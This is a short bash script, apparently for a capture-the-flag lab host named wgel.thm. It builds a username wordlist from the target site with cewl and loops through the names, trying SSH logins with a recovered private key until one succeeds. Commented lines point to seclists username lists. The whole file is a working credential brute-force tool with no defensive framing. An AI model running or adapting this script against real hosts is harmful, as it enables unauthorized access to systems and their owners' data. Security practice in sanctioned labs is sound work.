#!/bin/bash

# Create worlist form website
# cewl http://wgel.thm/ > wordlist  
# cewl http://wgel.thm/sitemap >> wordlist  

ssh_host="wgel.thm"
ssh_port=22
private_key_path="id_rsa"

#userlist="/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt"
#userlist="/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt"
userlist="wordlist"

function try_ssh {
    username=$1
    if ssh -i "$private_key_path" -o BatchMode=yes -o StrictHostKeyChecking=no -p "$ssh_port" "$username@$ssh_host" 'echo success' 2>&1 | grep -q 'success'; then
        echo "[+] Succes! Username: $username"
        exit 0
    else
        echo "[-] Failed : $username"
    fi
}

while IFS= read -r username; do
    try_ssh "$username"
done < "$userlist"
